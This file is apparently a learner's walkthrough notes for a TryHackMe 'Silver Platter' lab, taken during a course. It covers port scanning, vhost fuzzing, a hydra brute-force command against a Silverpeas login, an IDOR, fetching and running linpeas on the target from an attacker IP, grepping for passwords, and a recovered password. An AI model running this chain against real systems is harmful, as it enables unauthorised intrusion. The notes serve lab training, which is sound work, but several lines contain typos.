@@ -1,0 +1,256 @@
+To Add the IP so that you dont keep on typing it
+
+```bash
+sudo nano /etc/hosts
+[IP] silverplatter.thm
+nmap -p- silverplatter.thm -T5 -v
+nmap -p 22,80,8080 -A silverplatter.thm -v
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
+|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
+
+80/tcp   open  http       nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+
+8080/tcp open  http-proxy
+|_http-title: Error
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Wed, 19 Feb 2025 06:32:37 GMT
+|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Wed, 19 Feb 2025 06:32:35 GMT
+|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|   HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Wed, 19 Feb 2025 06:32:36 GMT
+|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+```
+
+Rutscan
+
+Downloaded rustscan on Github
+
+unzip it
+
+```bash
+cd ~/Downloads 
+unzip rustscan-2.3.0-x86_64-linux.zip
+
+echo $PATH
+sudo mv rustscan /usr/local/bin
+
+cd ~/intro/silver
+rustscan -a silverplatter.thm -- -A
+
+```
+
+### Web App Enumeration - Part 1
+
+ssh - passer base authentication - less secure
+
+key based authentication - more secure
+
+### SSH (22)
+
+```bash
+ssh root@silverplatter.thm
+root@silverplatter.thm's password: 
+```
+
+- SSH uses password based authentication
+
+## HTTP (80)
+
+### Dirsearch
+
+```bash
+pipx install dirsearch
+dirsearch -u http://silverplatter.thm
+
+[02:39:30] Starting:                                                                  
+[02:40:15] 403 -  564B  - /assets/                                          
+[02:40:15] 301 -  178B  - /assets  ->  http://silverplatter.thm/assets/
+[02:40:41] 301 -  178B  - /images  ->  http://silverplatter.thm/images/     
+[02:40:41] 403 -  564B  - /images/
+[02:40:47] 200 -   17KB - /LICENSE.txt                                      
+[02:41:10] 200 -  771B  - /README.txt  
+```
+
+### Vhost
+
+copied raw on offensive Tyler’s github: https://raw.githubusercontent.com/TeneBrae93/offensivesecurity/refs/heads/main/vhost-fuzzer.sh
+
+```bash
+nano vhost-fuzzer.sh
+chmod +x vhost-fuzzer.sh
+**./vhost-fuzzer.sh -h
+./vhost-fuzzer.sh silverplatter.thm /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://silverplatter.thm 1
+./vhost-fuzzer.sh silverplatter.thm /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://silverplatter.thm 14124**
+```
+
+### Web Enumeration Part 2
+
+Burpsuite
+
+http://silverplatter.thm
+
+### Checking Web Features
+
+![1.png](attachment:3518ee87-6e38-4f76-bbe7-ccab0f84ea53:1.png)
+
+- Software information: Silverpeas
+- Username Enumeration: scr1ptkiddy
+
+## HTTP (8080)
+
+![image.png](attachment:d56fed8f-2561-4e95-bd61-d39720f849f5:image.png)
+
+### Creating Custom Password List
+
+```bash
+cewl http://silverplatter.thm >custom_passwords.txt
+```
+
+I installed Turbo Intruder in Burp Extension App store
+
+examples/basic.py
+
+Put path with password and attack
+
+Cracked password using Turbo intruder
+
+![2.png](attachment:b3aeaf85-cd82-4b38-8f5e-e2b1d1c38e3e:2.png)
+
+Password: 
+
+### Using hydra
+
+```bash
+hydra -l scr1ptkiddy -P custom_passwords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:Login or password incorrect" -V -t 2
+
+```
+
+### Using Caido
+
+![image.png](attachment:bccc8c99-0369-4ead-b20a-2e18b9eec49a:image.png)
+
+### Remote Access to the Backend Server | IDORs
+
+![image.png](attachment:3f0d72c3-a215-4bf5-bc9c-7dd7154b73be:image.png)
+
+### Manual Privilege Escalation | Post Exploitation
+
+```bash
+suod -l #To check if the user we have can run anything
+```
+
+![image.png](attachment:7fe91336-dbb5-4431-9efa-103952b5cb12:image.png)
+
+### Interesting Group - ADM
+
+![image.png](attachment:0c021b13-d982-48ed-b9b5-19ef7ed7400a:image.png)
+
+![image.png](attachment:922d965b-67fd-4be6-90fc-99d26ee8e9d3:image.png)
+
+### Users
+
+- There is another user name tyler on the machine
+- opt folder
+- var folder
+
+![image.png](attachment:ab5b734b-7d86-43ff-94cd-0b8cd8abd1e4:image.png)
+
+```bash
+cd ..
+ls -la
+cd tyler
+cd / #root folder
+ls -la
+cd /opt #an important folder to check
+ls -la
+cd ../../
+cd var
+ls -la
+```
+
+### Privsec Checklist
+
+```bash
+uname -a
+cat /etc/issue
+
+```
+
+l got the linpeas
+
+Terminal Command
+
+```bash
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+python3 -m http.server 80
+```
+
+Linpeas Command
+
+```bash
+cd /tmp
+wget http://10.2.33.29/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+### The best way is to use grep function
+
+```bash
+grep -ir "password"
+```
+
+![image.png](attachment:2942ede0-2a8b-4b0a-8fc2-f891e6b66e43:image.png)
+
+- *_Zd*zx7N823/
+
+### We are in
+
+![image.png](attachment:91bf659d-0bb7-4e5d-9f60-830514d8155d:image.png)
+
+# **How To Privesc In Your Career!**
+
+Congratulations on making it to the end of the course! In this video, I provide some next steps I recommend.
+
+Here are links to two Discords I recommend:
+
+- Hack Smarter: https://discord.gg/hacksmarter
+- Simply Cyber: https://discord.gg/simplycyber
+
+Here are links to the platforms I mention in the video:
+
+- TryHackMe: [https://tryhackme.com](https://tryhackme.com/)
+- Hack The Box: [https://app.hackthebox.com](https://app.hackthebox.com/)
+- VulnLab: [https://vulnlab.com](https://vulnlab.com/)
+- PwnedLabs: [https://pwnedlabs.io](https://pwnedlabs.io/)
+
+Finally, here's my YouTube channel!
+
+- https://youtube.com/@TylerRamsbey
